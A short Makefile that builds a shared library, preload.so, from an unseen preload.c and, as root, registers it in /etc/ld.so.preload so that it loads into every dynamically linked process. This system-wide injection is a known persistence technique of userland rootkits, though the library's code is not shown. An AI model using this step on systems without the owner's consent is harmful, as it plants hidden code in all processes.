# all: preload.so install

install: build
ifneq ($(shell id -u), 0)
	@echo "You must be root to perform this action."
else
	mv preload.so /usr/local/lib/preload.so
	sh -c "echo '/usr/local/lib/preload.so' >> /etc/ld.so.preload"
endif

build: preload.c
	@gcc -Wall -fPIC -shared -o preload.so preload.c -ldl

.PHONY clean:
	rm -f preload.so
